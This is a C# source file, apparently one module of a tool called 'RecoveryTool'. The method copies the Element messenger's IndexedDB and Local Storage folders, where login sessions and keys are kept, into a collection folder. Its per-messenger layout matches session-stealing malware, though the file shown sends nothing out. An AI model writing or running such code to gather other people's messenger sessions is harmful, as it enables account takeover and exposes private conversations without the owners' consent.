using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    public class ElementService
    {
        public static async Task SaveElementAsync()
        {
            string elementFolder = Path.Combine(Common.AppData, "Element");
            if (!Directory.Exists(elementFolder)) return;

            string elementSession = Common.EnsureElementPath();

            await MessengerHelper.CopyDirectoryAsync(Path.Combine(elementFolder, "IndexedDB"), Path.Combine(elementSession, "IndexedDB"));
            await MessengerHelper.CopyDirectoryAsync(Path.Combine(elementFolder, "Local Storage"), Path.Combine(elementSession, "Local Storage"));
        }
    }
}
